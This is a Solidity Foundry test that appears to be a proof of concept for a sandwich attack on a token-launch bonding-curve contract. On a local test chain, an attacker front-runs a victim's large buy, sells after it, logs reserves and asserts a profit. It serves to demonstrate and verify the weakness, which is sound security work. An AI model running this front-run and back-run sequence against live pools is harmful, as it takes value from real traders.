// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "contracts/fun/Bonding.sol";
import "contracts/fun/FRouter.sol";
import "contracts/fun/FFactory.sol";
import "contracts/fun/FERC20.sol";
import "contracts/token/Virtual.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

contract BondingSandwichAttackTest is Test {
    // Constants
    uint256 constant LAUNCH_FEE = 100_000;
    uint256 constant INIT_SUPPLY = 1_000_000_000;
    uint256 constant ASSET_RATE = 10_000;
    uint256 constant MAX_TX = 100;
    uint256 constant GRADUAL_THRESHOLD = 85_000_000 ether;

    // Contracts
    VirtualToken virtualToken;
    FFactory fFactory;
    FRouter fRouter;
    Bonding bonding;
    address agentFactoryMock;


    // Actors
    address deployer = makeAddr("deployer");
    address victim = makeAddr("victim");    // Attack target
    address feeTo = makeAddr("feeTo");
    address attacker = makeAddr("attacker"); // Attacker

    function setUp() public {
        vm.startPrank(deployer);
        
       
        // Deploy VirtualToken
        virtualToken = new VirtualToken(1000 ether, deployer);
        
        // Set up FFactory
        FFactory fFactoryImpl = new FFactory();
        TransparentUpgradeableProxy fFactoryProxy = new TransparentUpgradeableProxy(
            address(fFactoryImpl),
            address(deployer),
            abi.encodeWithSignature("initialize(address,uint256,uint256)", feeTo, 1, 1)
        );
        fFactory = FFactory(address(fFactoryProxy));
        
        // Grant admin role first
        fFactory.grantRole(fFactory.ADMIN_ROLE(), deployer);
        
        // Set up FRouter
        FRouter fRouterImpl = new FRouter();
        TransparentUpgradeableProxy fRouterProxy = new TransparentUpgradeableProxy(
            address(fRouterImpl),
            address(deployer),
            abi.encodeWithSignature("initialize(address,address)", address(fFactory), address(virtualToken))
        );
        fRouter = FRouter(address(fRouterProxy));
        
        // Configure factory and router - after roles are granted
        fFactory.setRouter(address(fRouter));
        fRouter.grantRole(fRouter.ADMIN_ROLE(), deployer);
        // fRouter.setTaxManager(feeTo);
        
        // Create agent factory mock
        agentFactoryMock = makeAddr("agentFactoryMock");
        
        // Set up Bonding
        Bonding bondingImpl = new Bonding();
        TransparentUpgradeableProxy bondingProxy = new TransparentUpgradeableProxy(
            address(bondingImpl),
            address(deployer),
            abi.encodeWithSignature(
                "initialize(address,address,address,uint256,uint256,uint256,uint256,address,uint256)",
                address(fFactory),
                address(fRouter),
                feeTo,
                LAUNCH_FEE,
                INIT_SUPPLY,
                ASSET_RATE,
                MAX_TX,
                agentFactoryMock,
                GRADUAL_THRESHOLD
            )
        );
        bonding = Bonding(address(bondingProxy));
        
        // Set deployment parameters
        bonding.setDeployParams(Bonding.DeployParams({
            tbaSalt: bytes32(0),
            tbaImplementation: makeAddr("tbaImplementation"),
            daoVotingPeriod: 600,
            daoThreshold: 1000 ether
        }));
        
        // Grant necessary roles
        fFactory.grantRole(fFactory.CREATOR_ROLE(), address(bonding));
        fRouter.grantRole(fRouter.EXECUTOR_ROLE(), address(bonding));
        
        // Prepare tokens for testing
        virtualToken.mint(victim, 10000 ether);     // Victim funds
        virtualToken.mint(attacker, 1000 ether);    // Attacker funds
        vm.stopPrank();
        
        // Prepare approvals
        vm.prank(victim);
        virtualToken.approve(address(bonding), type(uint256).max);
        
        vm.prank(attacker);
        virtualToken.approve(address(bonding), type(uint256).max);
    }
    
    function testSandwichAttack() public {
        // Step 1: Create a token and establish initial pool
        console.log("\n===== Step 1: Create Token =====");
        vm.prank(deployer);
        virtualToken.mint(deployer, 200 ether);
        
        vm.startPrank(deployer);
        virtualToken.approve(address(bonding), 200 ether);
        (address tokenAddress,,) = bonding.launchFor(
            "VulToken", 
            "$VUL", 
            getBasicCores(), 
            "Token vulnerable to sandwich attacks", 
            "", 
            ["", "", "", ""], 
            200 ether,
            deployer
        );
        vm.stopPrank();
        
        FERC20 vulnerableToken = FERC20(tokenAddress);
        
        // Record initial state
        console.log("\n===== Initial State =====");
        logBalances(virtualToken, vulnerableToken, victim, attacker);
        
        // Step 2: Attacker front-run transaction
        console.log("\n===== Step 2: Attacker Front-run =====");

        vm.startPrank(attacker);

        virtualToken.approve(address(fRouter), type(uint256).max);
        vulnerableToken.approve(address(fRouter), type(uint256).max);

        bonding.buy(100 ether, tokenAddress);
        logBalances(virtualToken, vulnerableToken, victim, attacker);
        logPoolState(tokenAddress);

        vm.stopPrank();

        // Step 3: Victim executes large transaction
        console.log("\n===== Step 3: Victim's Large Transaction =====");
        vm.startPrank(victim);
        virtualToken.approve(address(fRouter), type(uint256).max);
        vulnerableToken.approve(address(fRouter), type(uint256).max);

        bonding.buy(5000 ether, tokenAddress);
        logBalances(virtualToken, vulnerableToken, victim, attacker);
        logPoolState(tokenAddress);
        vm.stopPrank();

        // Step 4: Attacker back-run transaction
        console.log("\n===== Step 4: Attacker Back-run =====");
        uint256 attackerBalance = vulnerableToken.balanceOf(attacker);
        
        vm.startPrank(attacker);
       
        bonding.sell(attackerBalance, tokenAddress);
        vm.stopPrank();
        
        // Calculate profit
        uint256 finalAttackerBalance = virtualToken.balanceOf(attacker);
        int256 profit = int256(finalAttackerBalance) - int256(1000 ether); 


        console.log("\n===== Final State =====");
        logBalances(virtualToken, vulnerableToken, victim, attacker);
        console.log("Attacker profit: %s VirtualToken", profit / 1e18);
        
        // Confirm profit is positive
        assertGt(profit, 0, "Attacker should earn positive profit");
        
    }
    
    // Helper function: Record balances
    function logBalances(VirtualToken _vt, FERC20 _token, address _victim, address _attacker) internal view {
        console.log("Victim: %s VirtualToken, %s tokens", _vt.balanceOf(_victim) / 1e18, _token.balanceOf(_victim));
        console.log("Attacker: %s VirtualToken, %s tokens", _vt.balanceOf(_attacker) / 1e18, _token.balanceOf(_attacker));
    }
    
    // Helper function: Record pool state
    function logPoolState(address tokenAddress) internal view {
        address pairAddress = fFactory.getPair(tokenAddress, address(virtualToken));
        IFPair pair = IFPair(pairAddress);
        (uint256 reserveToken, uint256 reserveAsset) = pair.getReserves(); // reserveA is funToken, reserveB is assetToken
        console.log("Pool state - Token reserve: %s, Asset reserve: %s", reserveToken, reserveAsset);
        console.log("Price: %s tokens/VirtualToken", (reserveToken * 1e18) / reserveAsset / 1e18);
    }
    
    // Helper function: Generate basic cores array
    function getBasicCores() internal pure returns (uint8[] memory) {
        uint8[] memory cores = new uint8[](3);
        cores[0] = 0;
        cores[1] = 1;
        cores[2] = 2;
        return cores;
    }
}